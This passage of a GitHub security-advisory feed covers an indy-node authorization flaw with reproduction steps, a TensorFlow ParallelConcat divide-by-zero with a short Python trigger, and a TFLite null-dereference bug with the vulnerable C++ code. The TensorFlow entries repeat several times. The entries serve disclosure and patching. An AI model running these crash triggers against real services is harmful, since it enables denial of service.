<p><a href="https://github.com/hyperledger/indy-node/blob/e5676b703d625e42c9547333bd03bb8307ed534c/indy_node/server/request_handlers/domain_req_handlers/nym_handler.py">NymHandler</a> method <code>update_state</code>, line 62. I think that we need to check if the DID which signs the transaction, owns the DID or is its endorser.</p>
<h1 id="steps-to-reproduce">Steps to Reproduce</h1>
<h2 id="environment">Environment</h2>
<p>Ubuntu 18.04
Docker version 19.03.8
<a href="https://github.com/hyperledger/indy-sdk/tree/master/cli">indy-cli</a>
<a href="https://github.com/hyperledger/indy-sdk/tree/master/ci">indy-ci</a> Dockerfile is copied in this archive
To install indy-cli, run <code>./install_indy_cli.sh</code></p>
<h2 id="command">Command</h2>
<p>Here is the script to create the container, run the attack and remove the container and the image. Find below the command to execute each step separately.</p>
<pre><code>./full_attack.sh
</code></pre>
<h3 id="installation-of-the-environment">Installation of the environment</h3>
<p>Install indy-cli and create an image with tag <code>test</code> from Dockerfile</p>
<pre><code>./install.sh
</code></pre>
<h3 id="exploit">Exploit</h3>
<pre><code>indy-cli proof_of_concept
</code></pre>
<h3 id="uninstallation-of-the-environment">Uninstallation of the environment</h3>
<p>Suppress the container <code>test</code> and remove the image <code>test</code></p>
<pre><code>./uninstall.sh
</code></pre>
<h1 id="analysis">Analysis</h1>
<p>We are grateful to @alexandredeleze for discovering and responsibly disclosing the issue.</p>
<p>We were previously aware that any DID on the ledger can "update" the state (seqNo + txnTime) if it doesn't change the state data itself. We considered this a minor bug because only the seqNo and txnTime changed. But seeing that this can also affect the "parent" DID means that it has a higher severity.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/hyperledger/indy-node/security/advisories/GHSA-wh2w-39f4-rpv2">https://github.com/hyperledger/indy-node/security/advisories/GHSA-wh2w-39f4-rpv2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-11093">https://nvd.nist.gov/vuln/detail/CVE-2020-11093</a></li>
<li><a href="https://github.com/hyperledger/indy-node/commit/55056f22c83b7c3520488b615e1577e0f895d75a">https://github.com/hyperledger/indy-node/commit/55056f22c83b7c3520488b615e1577e0f895d75a</a></li>
<li><a href="https://github.com/hyperledger/indy-node/blob/master/CHANGELOG.md#1124">https://github.com/hyperledger/indy-node/blob/master/CHANGELOG.md#1124</a></li>
<li><a href="https://github.com/hyperledger/indy-node/blob/master/docs/source/auth_rules.md">https://github.com/hyperledger/indy-node/blob/master/docs/source/auth_rules.md</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/indy-node/PYSEC-2020-48.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/indy-node/PYSEC-2020-48.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-wh2w-39f4-rpv2">https://github.com/advisories/GHSA-wh2w-39f4-rpv2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wh2w-39f4-rpv2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-30T18:41:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow] FPE in `ParallelConcat`]]></title>
        <id>https://github.com/advisories/GHSA-7v94-64hj-m82h</id>
        <link href="https://github.com/advisories/GHSA-7v94-64hj-m82h"/>
        <updated>2024-08-29T22:09:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <a href="https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/inplace_ops.cc#L72-L97">implementation of <code>ParallelConcat</code></a> misses some input validation and can produce a division by 0:</p>
<pre><code class="language-python">import tensorflow as tf

@tf.function
def test():
  y = tf.raw_ops.ParallelConcat(values=[['tf']],shape=0)
  return y

test()
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235">f2c3931113eaafe9ef558faaddd48e00a6606235</a>.</p>
<p>The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by members of the Aivul Team from Qihoo 360.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7v94-64hj-m82h">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7v94-64hj-m82h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41207">https://nvd.nist.gov/vuln/detail/CVE-2021-41207</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235">https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/9de11bdc2cf1284b2f635419bd3e6bbc7643eb2c">https://github.com/tensorflow/tensorflow/commit/9de11bdc2cf1284b2f635419bd3e6bbc7643eb2c</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/d11f21bbdfa54f3576ae860fc927bf23c675ebc0">https://github.com/tensorflow/tensorflow/commit/d11f21bbdfa54f3576ae860fc927bf23c675ebc0</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/e67caccea81167402c62977b5c521f2a8b261d6a">https://github.com/tensorflow/tensorflow/commit/e67caccea81167402c62977b5c521f2a8b261d6a</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/inplace_ops.cc#L72-L97">https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/inplace_ops.cc#L72-L97</a></li>
<li><a href="https://github.com/advisories/GHSA-7v94-64hj-m82h">https://github.com/advisories/GHSA-7v94-64hj-m82h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7v94-64hj-m82h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-11-10T19:02:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow] FPE in `ParallelConcat`]]></title>
        <id>https://github.com/advisories/GHSA-7v94-64hj-m82h</id>
        <link href="https://github.com/advisories/GHSA-7v94-64hj-m82h"/>
        <updated>2024-08-29T22:09:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <a href="https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/inplace_ops.cc#L72-L97">implementation of <code>ParallelConcat</code></a> misses some input validation and can produce a division by 0:</p>
<pre><code class="language-python">import tensorflow as tf

@tf.function
def test():
  y = tf.raw_ops.ParallelConcat(values=[['tf']],shape=0)
  return y

test()
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235">f2c3931113eaafe9ef558faaddd48e00a6606235</a>.</p>
<p>The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by members of the Aivul Team from Qihoo 360.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7v94-64hj-m82h">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7v94-64hj-m82h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41207">https://nvd.nist.gov/vuln/detail/CVE-2021-41207</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235">https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/9de11bdc2cf1284b2f635419bd3e6bbc7643eb2c">https://github.com/tensorflow/tensorflow/commit/9de11bdc2cf1284b2f635419bd3e6bbc7643eb2c</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/d11f21bbdfa54f3576ae860fc927bf23c675ebc0">https://github.com/tensorflow/tensorflow/commit/d11f21bbdfa54f3576ae860fc927bf23c675ebc0</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/e67caccea81167402c62977b5c521f2a8b261d6a">https://github.com/tensorflow/tensorflow/commit/e67caccea81167402c62977b5c521f2a8b261d6a</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/inplace_ops.cc#L72-L97">https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/inplace_ops.cc#L72-L97</a></li>
<li><a href="https://github.com/advisories/GHSA-7v94-64hj-m82h">https://github.com/advisories/GHSA-7v94-64hj-m82h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7v94-64hj-m82h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-11-10T19:02:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow] FPE in `ParallelConcat`]]></title>
        <id>https://github.com/advisories/GHSA-7v94-64hj-m82h</id>
        <link href="https://github.com/advisories/GHSA-7v94-64hj-m82h"/>
        <updated>2024-08-29T22:09:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <a href="https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/inplace_ops.cc#L72-L97">implementation of <code>ParallelConcat</code></a> misses some input validation and can produce a division by 0:</p>
<pre><code class="language-python">import tensorflow as tf

@tf.function
def test():
  y = tf.raw_ops.ParallelConcat(values=[['tf']],shape=0)
  return y

test()
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235">f2c3931113eaafe9ef558faaddd48e00a6606235</a>.</p>
<p>The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by members of the Aivul Team from Qihoo 360.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7v94-64hj-m82h">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7v94-64hj-m82h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41207">https://nvd.nist.gov/vuln/detail/CVE-2021-41207</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235">https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/9de11bdc2cf1284b2f635419bd3e6bbc7643eb2c">https://github.com/tensorflow/tensorflow/commit/9de11bdc2cf1284b2f635419bd3e6bbc7643eb2c</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/d11f21bbdfa54f3576ae860fc927bf23c675ebc0">https://github.com/tensorflow/tensorflow/commit/d11f21bbdfa54f3576ae860fc927bf23c675ebc0</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/e67caccea81167402c62977b5c521f2a8b261d6a">https://github.com/tensorflow/tensorflow/commit/e67caccea81167402c62977b5c521f2a8b261d6a</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/inplace_ops.cc#L72-L97">https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/inplace_ops.cc#L72-L97</a></li>
<li><a href="https://github.com/advisories/GHSA-7v94-64hj-m82h">https://github.com/advisories/GHSA-7v94-64hj-m82h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7v94-64hj-m82h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-11-10T19:02:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-gpu] Null pointer dereference in TFLite MLIR optimizations]]></title>
        <id>https://github.com/advisories/GHSA-wf5p-c75w-w3wh</id>
        <link href="https://github.com/advisories/GHSA-wf5p-c75w-w3wh"/>
        <updated>2024-08-29T22:06:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker can craft a TFLite model that would trigger a null pointer dereference, which would result in a crash and denial of service:</p>
<p>This is caused by the MLIR optimization of <code>L2NormalizeReduceAxis</code> operator. The <a href="https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70">implementation</a> unconditionally dereferences a pointer to an iterator to a vector without checking that the vector has elements:</p>
<pre><code class="language-cc">bool L2NormalizeReduceAxis(Value sq_op, DenseElementsAttr axis) {
  if (sq_op.getType().cast&lt;ShapedType&gt;().getRank() - 1 ==
          *axis.getValues&lt;int&gt;().begin() ||
      *axis.getValues&lt;int&gt;().begin() == -1) {
      // ...
  }
  // ...
}
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955">d6b57f461b39fd1aa8c1b870f1b974aac3554955</a>.</p>
<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-37689">https://nvd.nist.gov/vuln/detail/CVE-2021-37689</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955">https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70</a></li>
<li><a href="https://github.com/advisories/GHSA-wf5p-c75w-w3wh">https://github.com/advisories/GHSA-wf5p-c75w-w3wh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wf5p-c75w-w3wh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-08-25T14:39:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-gpu] Null pointer dereference in TFLite MLIR optimizations]]></title>
        <id>https://github.com/advisories/GHSA-wf5p-c75w-w3wh</id>
        <link href="https://github.com/advisories/GHSA-wf5p-c75w-w3wh"/>
        <updated>2024-08-29T22:06:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker can craft a TFLite model that would trigger a null pointer dereference, which would result in a crash and denial of service:</p>
<p>This is caused by the MLIR optimization of <code>L2NormalizeReduceAxis</code> operator. The <a href="https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70">implementation</a> unconditionally dereferences a pointer to an iterator to a vector without checking that the vector has elements:</p>
<pre><code class="language-cc">bool L2NormalizeReduceAxis(Value sq_op, DenseElementsAttr axis) {
  if (sq_op.getType().cast&lt;ShapedType&gt;().getRank() - 1 ==
          *axis.getValues&lt;int&gt;().begin() ||
      *axis.getValues&lt;int&gt;().begin() == -1) {
      // ...
  }
  // ...
}
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955">d6b57f461b39fd1aa8c1b870f1b974aac3554955</a>.</p>
<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-37689">https://nvd.nist.gov/vuln/detail/CVE-2021-37689</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955">https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70</a></li>
<li><a href="https://github.com/advisories/GHSA-wf5p-c75w-w3wh">https://github.com/advisories/GHSA-wf5p-c75w-w3wh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wf5p-c75w-w3wh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-08-25T14:39:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-gpu] Null pointer dereference in TFLite MLIR optimizations]]></title>
        <id>https://github.com/advisories/GHSA-wf5p-c75w-w3wh</id>
        <link href="https://github.com/advisories/GHSA-wf5p-c75w-w3wh"/>
        <updated>2024-08-29T22:06:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker can craft a TFLite model that would trigger a null pointer dereference, which would result in a crash and denial of service:</p>
<p>This is caused by the MLIR optimization of <code>L2NormalizeReduceAxis</code> operator. The <a href="https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70">implementation</a> unconditionally dereferences a pointer to an iterator to a vector without checking that the vector has elements:</p>
<pre><code class="language-cc">bool L2NormalizeReduceAxis(Value sq_op, DenseElementsAttr axis) {
  if (sq_op.getType().cast&lt;ShapedType&gt;().getRank() - 1 ==
          *axis.getValues&lt;int&gt;().begin() ||
      *axis.getValues&lt;int&gt;().begin() == -1) {
      // ...
  }
  // ...
}
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955">d6b57f461b39fd1aa8c1b870f1b974aac3554955</a>.</p>
<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-37689">https://nvd.nist.gov/vuln/detail/CVE-2021-37689</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955">https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70</a></li>
<li><a href="https://github.com/advisories/GHSA-wf5p-c75w-w3wh">https://github.com/advisories/GHSA-wf5p-c75w-w3wh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wf5p-c75w-w3wh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-08-25T14:39:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-cpu] Null pointer dereference in TFLite MLIR optimizations]]></title>
        <id>https://github.com/advisories/GHSA-wf5p-c75w-w3wh</id>
        <link href="https://github.com/advisories/GHSA-wf5p-c75w-w3wh"/>
        <updated>2024-08-29T22:06:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker can craft a TFLite model that would trigger a null pointer dereference, which would result in a crash and denial of service:</p>
<p>This is caused by the MLIR optimization of <code>L2NormalizeReduceAxis</code> operator. The <a href="https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70">implementation</a> unconditionally dereferences a pointer to an iterator to a vector without checking that the vector has elements:</p>
<pre><code class="language-cc">bool L2NormalizeReduceAxis(Value sq_op, DenseElementsAttr axis) {
  if (sq_op.getType().cast&lt;ShapedType&gt;().getRank() - 1 ==
          *axis.getValues&lt;int&gt;().begin() ||
      *axis.getValues&lt;int&gt;().begin() == -1) {
      // ...
  }
  // ...
}
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955">d6b57f461b39fd1aa8c1b870f1b974aac3554955</a>.</p>
<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-37689">https://nvd.nist.gov/vuln/detail/CVE-2021-37689</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955">https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70</a></li>
<li><a href="https://github.com/advisories/GHSA-wf5p-c75w-w3wh">https://github.com/advisories/GHSA-wf5p-c75w-w3wh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wf5p-c75w-w3wh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-08-25T14:39:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-cpu] Null pointer dereference in TFLite MLIR optimizations]]></title>
        <id>https://github.com/advisories/GHSA-wf5p-c75w-w3wh</id>
        <link href="https://github.com/advisories/GHSA-wf5p-c75w-w3wh"/>
        <updated>2024-08-29T22:06:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker can craft a TFLite model that would trigger a null pointer dereference, which would result in a crash and denial of service:</p>
<p>This is caused by the MLIR optimization of <code>L2NormalizeReduceAxis</code> operator. The <a href="https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70">implementation</a> unconditionally dereferences a pointer to an iterator to a vector without checking that the vector has elements:</p>
<pre><code class="language-cc">bool L2NormalizeReduceAxis(Value sq_op, DenseElementsAttr axis) {
  if (sq_op.getType().cast&lt;ShapedType&gt;().getRank() - 1 ==
          *axis.getValues&lt;int&gt;().begin() ||
      *axis.getValues&lt;int&gt;().begin() == -1) {
      // ...
  }
  // ...
}
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955">d6b57f461b39fd1aa8c1b870f1b974aac3554955</a>.</p>
<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-37689">https://nvd.nist.gov/vuln/detail/CVE-2021-37689</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955">https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70</a></li>
<li><a href="https://github.com/advisories/GHSA-wf5p-c75w-w3wh">https://github.com/advisories/GHSA-wf5p-c75w-w3wh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wf5p-c75w-w3wh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-08-25T14:39:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-cpu] Null pointer dereference in TFLite MLIR optimizations]]></title>
        <id>https://github.com/advisories/GHSA-wf5p-c75w-w3wh</id>
        <link href="https://github.com/advisories/GHSA-wf5p-c75w-w3wh"/>
        <updated>2024-08-29T22:06:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker can craft a TFLite model that would trigger a null pointer dereference, which would result in a crash and denial of service:</p>
